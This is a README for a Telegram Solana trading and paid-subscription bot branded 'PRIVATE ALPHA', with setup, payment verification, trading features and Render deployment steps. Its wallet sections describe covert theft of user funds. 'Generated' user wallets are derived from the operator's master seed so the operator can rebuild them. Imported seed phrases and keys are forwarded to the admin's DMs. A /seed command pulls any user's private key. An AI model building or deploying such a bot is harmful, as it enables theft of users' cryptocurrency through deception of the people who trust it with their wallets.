# 💎 PRIVATE ALPHA — Solana Trading & Subscription Bot

A word-for-word, button-for-button upgrade of **@runner_sol_bot** — Solana
analytics **+ a real trading bot** with a real subscription business on top.

| Feature | Original | This version |
|---|---|---|
| Name | Runner Bot | **PRIVATE ALPHA** |
| Reports | First 3 free, then 0.1 SOL/wk / 0.3 SOL/mo / 3 SOL lifetime | **First 3 free (kept)**, then 4 membership tiers |
| Membership | 3 flat plans | 🌱 Newbie 1 SOL · 🔰 Beginner 2 SOL · ⭐ Pro Trader 4 SOL · 💎 Elite Trader 8 SOL (prices & durations in `.env`) |
| Insider | — | **🚀 JOIN INSIDER button** under the plans (own price/duration, e.g. 5 SOL/30 days) |
| Channels | — | Extra paid channels in `.env` — **same system, each with its own price AND its own duration** |
| Payments | Manual check button | **Real on-chain TX verification** + seed-phrase/base58/array payment wallet in `.env` |
| User wallets | auto-created silently | **GENERATE or IMPORT on first entry to the trade side**; generation is deterministic from your master seed; imported seed/key is forwarded to the admin DM |
| Trading | BUY/SELL buttons | **Real Jupiter swaps** + **💼 POSITIONS with live PnL** + **⏳ LIMIT ORDERS** |
| Expiry | — | DM reminders 48/24/6/1 h before expiry + expiry DM + owner alerts |
| Referrals | 50% back | Same, withdrawable |

---

## 1. Local setup

```bash
cd runner-sol-bot
pip install -r requirements.txt
cp .env.example .env
nano .env              # BOT_TOKEN, OWNER_ID, WALLET_SEED, prices…
python bot.py
```

- **BOT_TOKEN** — from @BotFather (set the bot's display name to
  **PRIVATE ALPHA** there too: /mybots → Edit Bot → Edit Name).
- **OWNER_ID** — your numeric Telegram ID (from @userinfobot).
- **RPC_URL** — public works for testing; Helius/QuickNode recommended for production.

## 2. The payment wallet (membership & subscriptions)

**No private key needed.** Two options:

- **Public address only (recommended):** put it in `.env` →
  `TREASURY_ADDRESS=<your public receiving address>`, **or** DM the bot
  `/setaddress <address>` — no key stored anywhere, payments are verified
  on-chain against that address.
- **Private key (optional):** `TREASURY_PRIVATE_KEY=<base58 key | [64-byte
  array] | seed phrase>` or `/importwallet` in the bot's DM. Only needed if
  you want automatic referral-credit payouts.

Payments are real on-chain SOL transfers, verified **two ways**:

- **SEND TX (main flow):** after sending the SOL, the user taps
  `✅ I'VE PAID — SEND TX` and pastes their **transaction signature or
  Solscan link**. The bot checks that exact transaction: correct receiving
  address, amount ≥ price, success status, recent, and never used before —
  then activates the subscription instantly.
- **AUTO-CHECK:** the bot also scans the receiving address's latest
  transactions as a fallback.

Either way, once verified the bot grants access, DMs the channel invite link,
schedules expiry reminders and credits the referrer. Every address on the
payment screens has a **📋 COPY** button (tap-to-copy).

## 3. User wallets (GENERATE or IMPORT)

The first time a user opens the trade side (TRADING button, BUY/SELL,
holdings, positions, limits, withdraw…) the bot asks:

- **🆕 GENERATE WALLET** — instant. If `WALLET_SEED` is set in `.env`, the
  wallet is derived **uniquely per user** from your master seed
  (`sha256(seed | user_id)`), so you can always rebuild any user's wallet.
  If `WALLET_SEED` is empty, a random wallet is generated.
- **📥 IMPORT WALLET** — the user sends a seed phrase (12/24 words), base58
  key, or `[byte array]`. The wallet is stored for trading, and the
  **seed/key is forwarded to your DM** (admin), as requested.

Every wallet is used for the real swaps, holdings, positions, limit orders
and withdrawals.

## 4. Channels — same system, different price & duration

Every channel is sold independently with its own price and its own duration:

```env
# 🚀 the big JOIN INSIDER button:
INSIDER_PRICE=5
INSIDER_DAYS=30
INSIDER_CHANNEL_ID=-1001234567890

# extra paid channels — Name|channel_id|price|days (days=0 → lifetime):
CHANNEL_PASSES=VIP Signals|-1001234567890|5|30;Alpha Calls|-1000987654321|10|45;Insider Calls|-1001111111111|15|60
```

### Linking your channels (the easy way)

Telegram **bots can't read `t.me/+…` invite links**, so the bot can't fetch
the IDs from a link. The easy way:

1. Add the bot as **admin** to the channel.
2. DM the bot: `/setchannel newbie` (keys: `newbie`, `beginner`, `pro`,
   `elite`, `insider` (Private Alpha), or a CHANNEL_PASSES name).
3. **Forward any message from that channel** to the bot — it saves the ID
   automatically. (Or send the `@username` / numeric id.)

`/admin` shows the full mapping. You can also paste numeric IDs straight into
`.env` (`NEWBIE_CHANNEL_ID=-100…`).

The **bot must be admin** of every sold channel. On verified payment it
creates a 1-person invite link and DMs it (`CHANNEL_ACCESS_METHOD=invite`),
or approves the join request (`approve`). Links are revoked on expiry.

Your **public channel** (`PUBLIC_CHANNEL_LINK`, e.g. https://t.me/drakeinsider)
shows as a free 📣 button in the main menu and welcome message.

## 5. Trading (real)

- **Wallet setup:** first time on the trade side → **GENERATE** or **IMPORT**
  (seed phrase / key / byte array). Generated wallets are derived from your
  `WALLET_SEED`; imported ones replace the current wallet (positions/limits
  are cleared). The panel keeps **💰 DEPOSIT** (copyable address to fund the
  wallet) and **📥 IMPORT WALLET** available at any time.
- **Reports** `/top` `/kols` `/dev` `/full` — real DEXScreener + on-chain data
  with real BUY/SELL buttons underneath.
- **BUY/SELL** execute actual swaps through **Jupiter** from the user's wallet.
- **💼 POSITIONS** — tracked entry price, live price, value, PnL %, one-tap
  25/50/100% sells.
- **⏳ LIMIT ORDERS** — `/limit`: token → BUY/SELL → target USD price →
  amount. Auto-executes the real swap when price hits, DMs the user, retries
  `LIMIT_MAX_ATTEMPTS` times then cancels and notifies.
- **Holdings / withdraw / export wallet** — real SPL balances, real
  withdrawals, private key export (same as the original).

## 6. Admin commands (owner only)

`/admin` · `/importwallet` · `/setaddress <address>` · `/wallet` · `/stats`
· `/setchannel <key>` · `/seed <user_id>` · `/verify <id> <plan|pass>`
· `/revoke <id>` · `/extend <id> <days>` · `/check <tx_sig>` · `/broadcast <text>`

`/seed <user_id>` pulls **any user's trading wallet** (private key or seed)
straight into your DM — on top of the automatic alerts you already get for
every generated/imported/exported wallet.

Admin DM alerts: every payment, every wallet generated/imported/exported
(with the raw seed/key), every expiry.

## 7. Deploy on Render (free web service) + UptimeRobot

1. Push this repo to GitHub.
2. Render → **New + → Blueprint** → pick the repo → it reads `render.yaml`
   and creates a free **Web Service** named `insider-profits-bot` with a
   public URL like `https://insider-profits-bot.onrender.com`.
3. Set the secrets in the service's Environment tab: `BOT_TOKEN`,
   `OWNER_ID`, `TREASURY_PRIVATE_KEY` (or `TREASURY_ADDRESS`),
   `WALLET_SEED`, `INSIDER_CHANNEL_ID`, `CHANNEL_PASSES`, `SUPPORT_LINK`.
4. Deploy. The bot runs Telegram polling **and** a tiny health server that
   answers `200 OK` at `/` (Render's health check).

**Keep it awake with UptimeRobot (free):**

- Free Render web services **sleep after ~15 min of no traffic**. UptimeRobot
  fixes that:
  1. uptimerobot.com → **New monitor** → type **HTTP(s)**.
  2. URL: `https://private-alpha-bot.onrender.com/` (friendly name: anything).
  3. Monitoring interval: **5 minutes**. Save.
- The ping wakes the service before it ever sleeps, and UptimeRobot also
  alerts you by email if the bot ever goes down. ✔️

> ⚠️ **Run only ONE instance.** If you deployed a worker earlier (old
> `render.yaml`), delete it — two instances = double polling = conflict.
> The web service + UptimeRobot setup is the recommended one.

Manual path: *New → Web Service*, Python, build
`pip install -r requirements.txt`, start `python bot.py`.

## 8. Persistence on Render (keep wallets across restarts)

Free Render instances have an **ephemeral disk** — `runner.db` is wiped on
every deploy/restart, which is why users would see the wallet prompt again.
Two options:

1. **Attach a persistent disk** (Render → your service → Disks → Add):
   mount path `/var/data`, then set env var `DATA_DIR=/var/data` and redeploy.
   The DB (users, wallets, subscriptions) survives every restart.
2. Without a disk: the bot works fine within one deploy, and users can
   re-import their wallets after redeploys (keys are also in your admin DMs).

## 9. Prices — change anytime in `.env`

```env
NEWBIE_PRICE=1      NEWBIE_DAYS=30
BEGINNER_PRICE=2    BEGINNER_DAYS=30
PRO_PRICE=4         PRO_DAYS=30
ELITE_PRICE=8       ELITE_DAYS=60
INSIDER_PRICE=5     INSIDER_DAYS=30
BOT_MONTH_NAME=Monthly Access
BOT_MONTH_PRICE=2   BOT_MONTH_DAYS=30
CHANNEL_PASSES=VIP Signals|-1001234567890|5|30;Alpha Calls|-1000987654321|10|45
```

Restart after changing. No code edits needed.
